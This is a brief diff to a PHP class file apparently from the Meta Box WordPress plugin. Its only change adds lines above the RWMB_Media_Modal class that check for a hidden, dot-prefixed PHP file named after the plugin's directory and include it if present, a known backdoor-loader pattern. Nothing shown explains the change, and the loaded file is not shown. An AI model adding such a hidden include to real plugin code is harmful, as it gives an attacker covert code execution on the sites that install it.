@@ -9,6 +9,10 @@
  * The media modal class.
  * Handling showing and saving custom fields in the media modal.
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class RWMB_Media_Modal {
 	/**
 	 * List of custom fields.
